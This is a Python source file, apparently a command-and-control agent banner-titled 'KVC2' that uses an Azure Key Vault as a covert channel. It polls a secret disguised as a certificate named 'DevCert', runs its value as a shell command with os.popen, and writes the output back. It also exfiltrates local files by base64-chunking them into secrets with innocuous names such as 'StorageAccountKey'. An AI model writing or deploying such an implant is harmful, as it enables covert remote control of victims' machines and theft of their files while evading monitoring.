import logging
import os
import base64
import time
import argparse
from argparse import RawTextHelpFormatter
from datetime import datetime, timezone, timedelta
from azure.identity import DefaultAzureCredential
from azure.keyvault.secrets import SecretClient
from azure.core.exceptions import ResourceNotFoundError, HttpResponseError

SecretList = ["DevCert", 
              "ProdCert", 
              "DevAPIKey", 
              "ProAPIKey", 
              "ComsosdbKey", 
              "EventHubKey", 
              "EventHubConnectionString", 
              "AppSecretKey", 
              "StorageAccountKey", 
              "RedisToken", 
              "SigninKeySecret"]
def dwnl(secret_client: SecretClient, file: str) -> None:
    # Nerd Note: max size 25000 bytes, but we want to encode in base64
    # so 4*(Ceiling(n/3)), so max is 18750
    CHUNK_SIZE = 18700
    MAX_SIZE = len(SecretList) * CHUNK_SIZE
    file_path = file if file[0] == os.sep \
		else os.path.join(os.getcwd(), file)
    chunk_id = 0
    if os.path.getsize(file_path) <= MAX_SIZE:
        with open(file_path, 'rb') as f:
            while True:
                content = f.read(CHUNK_SIZE)
		
                if not content:
                    break
                
                secret_client.set_secret(SecretList[chunk_id], 
                                         base64.b64encode(content))
                chunk_id+=1
            logging.debug("[+] File downloaded finished")
        logging.error("[!] File cannot be opened")
    else:
	    logging.error("[!] File to large, please add more secrets into code")

def main_loop(vault_name: str):
    credential = DefaultAzureCredential()
    secret_client = SecretClient(vault_url=f"https://{vault_name}.vault.azure.net/",
                                 credential=credential)
    timestamp = None
    tzinfo = timezone(timedelta(hours=0))

    try:
        secret_client.get_secret(SecretList[0])
        timestamp = datetime.now(tzinfo).replace(microsecond=0)
    except ResourceNotFoundError as re:
        secret_client.set_secret(SecretList[0], "-----BEGIN CERTIFICATE-----\n" +
        "MIICuTCCAaECAQAwHDELMAkGA1UEBhMCVVMxDTALBgNVBAoMBFRlc3QwggEiMA0G\n" +
        "CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCpNEehXUvao9FpTJkobl0BT9X+dSe9\n" + 
        "k5pGg0oy9Gs02kH3GO/8Hud4O/Li0i66WzHK/ZtZHROdfAUBzW4ZCMRNPiQveK8r\n" + 
        "FMCxOv4lobHablK34vO48I5kWrpviJg59m0jXdk+CEzuQXqqMJHsb8NZSR3BiK2r\n" + 
        "vM+VcpOs9W0lBzaasj+vSuUhRhbkr8MQqtMekTbMfoxVJ3hOyHO7oTPuWntnP2mi\n" + 
        "z8XlFIXQKa3vc5rGhwFfb55a25ZL4JH50oLACdMqunKJRpm1vn5pDQGoTi1UUEOL\n" + 
        "hdrpRPlCIpS7v4sy6f1JV4JV4eidtD0fMU5itSDg/YZRj/M8085/v2/tAgMBAAGg\n" + 
        "WDBWBgkqhkiG9w0BCQ4xSTBHMA4GA1UdDwEB/wQEAwIFoDAgBgNVHSUBAf8EFjAU\n" + 
        "BggrBgEFBQcDAQYIKwYBBQUHAwIwEwYDVR0RBAwwCoIIdGVzdC5jb20wDQYJKoZI\n" +
        "hvcNAQELBQADggEBAIQHpvW1J9sOcSrUyavv6kwiVPVe3Y6Lx0MsLhYZt8+PUb55\n" +
        "9aVZEtxaEplyPIbnuSRo6VkKeEYvh5Xio0PiEMUCxSNv+/H1jb9E4UB0kxRSpEfE\n" +
        "NSvWfhtc1jajj6NYkC/vUBLiv6YCIumoSoN/v/12WTeeM02Z4bQIHT3Jv2uaVkK1\n" +
        "xF3BEXdkFEo/m8M0AtKmzGTuZzHuDH7l4rbBqwFU1XAP8ZTNXkq54lDkt94GZ45n\n" +
        "n4tCaHhN/yda5JXdFmkL6vVxJs2PbiDLTYcwuycNFCHxX6FK0GX6KyJbYTsWnYDL\n" +
        "Bci7BZMYOnAmRAgk0c5J1zZLEs79kDe6vRQ4gBs=\n" +
        "-----END CERTIFICATE-----")
        timestamp = datetime.now(tzinfo).replace(microsecond=0)
    except HttpResponseError as he:
        print(he)
        exit(0)

    while True:
        time.sleep(10)
        secret = secret_client.get_secret(SecretList[0])
        s_timestamp = secret.properties.updated_on
        if s_timestamp > timestamp:
            if secret.value.startswith("dwnl"):
                file_path = secret.value.split("|")[1]
                output = dwnl(secret_client, file_path)
                secret_client.set_secret(SecretList[0], output)
            else:    
                stream = os.popen(secret.value)
                output = stream.read()
                secret_client.set_secret(SecretList[0], output)
                timestamp = datetime.now(tzinfo).replace(microsecond=0)
            logging.debug(f"[*] {secret.value}: {output}")
        logging.debug("[+] Working")

def main():
    parser = argparse.ArgumentParser(description =
" _  ____     __ ____  ____  \n" +
"| |/ /\ \   / // ___||___ \ \n" +
"| ' /  \ \ / /| |      __) |\n" +
"| . \   \ V / | |___  / __/ \n" +
"|_|\_\   \_/   \____||_____|\n", 
    formatter_class=RawTextHelpFormatter)

    parser.add_argument("-vt", "--vault", type = str, 
                        metavar = "vault", required=True,
                        help = "Pass vault name to execute on current agent")

    args = parser.parse_args()
    
    main_loop(args.vault)

if __name__ == '__main__':
    main()